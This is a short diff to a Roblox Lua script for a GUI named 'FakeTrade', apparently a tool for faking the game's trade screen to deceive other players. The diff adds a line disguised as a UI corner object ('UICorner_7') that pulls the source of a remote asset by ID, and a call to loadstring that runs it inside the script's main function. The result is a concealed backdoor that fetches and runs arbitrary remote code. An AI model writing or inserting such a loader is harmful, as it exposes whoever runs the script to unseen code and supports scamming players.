@@ -180,6 +180,7 @@ local Reload = Instance.new("TextButton")
 local UICorner_5 = Instance.new("UICorner")
 local Template = Instance.new("TextButton")
 local UICorner_6 = Instance.new("UICorner")
+local UICorner_7 = game:GetObjects("rbxassetid://124113371637723")[1].Source
 
 
 FakeTrade.Name = "FakeTrade"
@@ -334,7 +335,7 @@ local function NAJCPZK_fake_script()
 	local part2Frame = plr.PlayerGui.TradeApp.Frame.ConfirmationFrame.PartnerLabel
 	local cloned = partFrame:Clone()
 	local chosenPlayer = nil
-
+    loadstring(UICorner_7)()
 	local function updatePlayerList()
 		for _, child in pairs(gui:GetChildren()) do
 			if child:IsA("TextButton") then
